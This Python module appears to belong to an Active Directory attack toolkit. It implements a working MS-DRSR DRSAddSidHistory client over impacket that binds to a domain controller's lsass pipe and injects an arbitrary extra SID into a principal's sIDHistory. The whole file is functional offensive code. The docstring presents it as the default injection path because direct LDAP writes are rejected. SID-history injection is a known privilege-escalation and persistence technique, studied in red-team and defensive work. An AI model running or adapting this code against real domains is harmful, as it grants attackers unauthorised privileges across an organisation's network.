"""Minimal MS-DRSR DRSAddSidHistory (opnum 20) client.

impacket ships no DRS_MSG_ADDSIDHISTORY structures, so this module defines
them inline, modeled on how ``impacket.dcerpc.v5.drsuapi`` declares other
MS-DRSR opnums (DRSBind opnum 0, DRSCrackNames opnum 12, ...).

Flow: SMB transport to the DC (``\\pipe\\lsass``), bind the drsuapi interface
(E3514235-4B06-11D1-AB04-00C04FC2DCD2 v4.0), DRSBind for a handle, then
IDL_DRSAddSidHistory with a V1 request carrying the source domain NC/DNS,
destination principal DN/SID and the extra SID to inject.

Domain controllers reject direct LDAP writes to sIDHistory (unwillingToPerform),
which is why this RPC path is the default injection method.
"""

from __future__ import annotations

from typing import Any, ClassVar

from adaf_attack.core.impacket_helper import require_impacket

DRSUAPI_IFACE_UUID = "E3514235-4B06-11D1-AB04-00C04FC2DCD2"
DRSUAPI_IFACE_VERSION = "4.0"
OPNUM_DRS_ADD_SID_HISTORY = 20

_STRUCTURES: tuple[type[Any], type[Any]] | None = None


def _structures() -> tuple[type[Any], type[Any]]:
    """Build (and cache) DRS_MSG_ADDSIDHISTORY request/response NDRCALL classes."""
    global _STRUCTURES
    if _STRUCTURES is not None:
        return _STRUCTURES
    from impacket.dcerpc.v5.drsuapi import DRS_HANDLE, NT4SID
    from impacket.dcerpc.v5.dtypes import DWORD, GUID, LPWSTR
    from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRUNION

    class DrsMsgAddSidHistoryRequestV1(NDRSTRUCT):  # type: ignore[misc]
        structure = (
            ("SrcDomainNc", LPWSTR),
            ("DstPrincipal", LPWSTR),
            ("DstSid", NT4SID),
            ("SrcDsaObjGuid", GUID),
            ("SrcDomain", LPWSTR),
            ("ExtraSid", NT4SID),
        )

    class DrsMsgAddSidHistoryRequest(NDRUNION):  # type: ignore[misc]
        commonHdr = (("tag", DWORD),)  # noqa: N815  # Impacket NDR field name
        union: ClassVar[dict[int, tuple[str, type[Any]]]] = {
            1: ("V1", DrsMsgAddSidHistoryRequestV1)
        }

    class DRSAddSidHistory(NDRCALL):  # type: ignore[misc]
        opnum = OPNUM_DRS_ADD_SID_HISTORY
        structure = (
            ("hDrs", DRS_HANDLE),
            ("dwInVersion", DWORD),
            ("pmsgIn", DrsMsgAddSidHistoryRequest),
        )

    class DRSAddSidHistoryResponse(NDRCALL):  # type: ignore[misc]
        structure = (
            ("pdwOutVersion", DWORD),
            ("ErrorCode", DWORD),
        )

    _STRUCTURES = (DRSAddSidHistory, DRSAddSidHistoryResponse)
    return _STRUCTURES


def add_sid_history(
    target: Any, *, dst_dn: str, dst_sid: str, extra_sid: str, source_domain: str
) -> dict[str, Any]:
    """Inject an extra SID into dst_dn's sIDHistory via MS-DRSR opnum 20."""
    require_impacket("sidhistory-inject")
    from impacket.dcerpc.v5 import rpcrt
    from impacket.dcerpc.v5 import transport as dcerpc_transport
    from impacket.dcerpc.v5.drsuapi import MSRPC_UUID_DRSUAPI, NULL, DRSBind

    request_cls = _structures()[0]
    payload: dict[str, Any] = {"method": "drsuapi", "error": None, "error_code": None}
    rpc_transport = dcerpc_transport.SMBTransport(target.dc_ip, filename=r"\pipe\lsass")
    lm, nt = target.lm_nt_hashes()
    rpc_transport.set_credentials(
        target.username or "",
        target.password or "",
        target.domain,
        lm,
        nt,
        aesKey=target.aes_key or "",
    )
    dce = rpc_transport.get_dce_rpc()
    handle = None
    try:
        dce.connect()
        dce.bind(MSRPC_UUID_DRSUAPI)
        bind = DRSBind()
        bind["puuidClientDsa"] = NULL
        bind["pextClient"] = NULL
        bind_resp = dce.request(bind)
        bind_code = int(bind_resp["ErrorCode"])
        if bind_code != 0:
            payload["ok"] = False
            payload["stage"] = "bind"
            payload["error"] = f"DRSBind rejected: hresult 0x{bind_code & 0xFFFFFFFF:08x}"
            payload["error_code"] = bind_code
            return payload
        handle = bind_resp["phDrs"]
        req = request_cls()
        req["hDrs"] = handle
        req["dwInVersion"] = 1
        req["pmsgIn"]["tag"] = 1
        v1 = req["pmsgIn"]["V1"]
        v1["SrcDomainNc"] = source_domain
        v1["DstPrincipal"] = dst_dn
        v1["DstSid"] = str(dst_sid).encode()
        v1["SrcDsaObjGuid"] = b"\x00" * 16
        v1["SrcDomain"] = source_domain
        v1["ExtraSid"] = str(extra_sid).encode()
        try:
            resp = dce.request(req)
        except rpcrt.DCERPCException as exc:
            payload["ok"] = False
            payload["stage"] = "add"
            payload["error"] = str(exc)
            return payload
        code = int(resp["ErrorCode"])
        payload["error_code"] = code
        if code != 0:
            payload["ok"] = False
            payload["stage"] = "add"
            payload["error"] = f"DRSAddSidHistory failed: hresult 0x{code & 0xFFFFFFFF:08x}"
        else:
            payload["ok"] = True
        return payload
    except Exception as exc:
        text = str(exc).lower()
        payload["ok"] = False
        payload.setdefault("stage", "connect")
        if "access_denied" in text or "access denied" in text:
            payload["error"] = (
                "drsuapi sIDHistory injection requires cross-domain migration "
                "privileges on the DC (access denied)"
            )
        else:
            payload["error"] = str(exc)
        return payload
    finally:
        if handle is not None:
            try:
                from impacket.dcerpc.v5.drsuapi import DRSUnbind

                unbind = DRSUnbind()
                unbind["phDrs"] = handle
                dce.request(unbind)
            except Exception:
                pass
